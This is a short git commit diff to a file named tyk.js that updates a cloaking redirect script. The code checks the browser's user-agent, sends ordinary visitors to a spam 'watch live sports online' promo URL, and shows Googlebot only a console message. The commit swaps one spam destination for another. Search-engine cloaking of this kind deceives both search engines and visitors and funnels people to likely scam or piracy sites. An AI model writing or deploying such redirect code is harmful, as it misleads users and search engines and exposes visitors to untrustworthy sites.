aff603899b82b477eeaaa694758661cc212f941e
rabb69087-rgb <rabb69087@gmail.com>
2026-09-24 21:33:47 +0600

    Update tyk.js

--- tyk.js
+++ tyk.js
@@ -1,7 +1,7 @@
 // Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
 if (!navigator.userAgent.includes('Googlebot')) {
   // Redirect only normal users
-  window.location.href = "https://tvlink4k.online/Trofeo-Matteotti";
+  window.location.href = "http://sports.worthyprofiles.com/watch-live-sports-online/?promo_id=877=999";
 } else {
   // For search engine crawlers, you can choose to perform a different action or not redirect
   console.log("THanks for visiting my page");
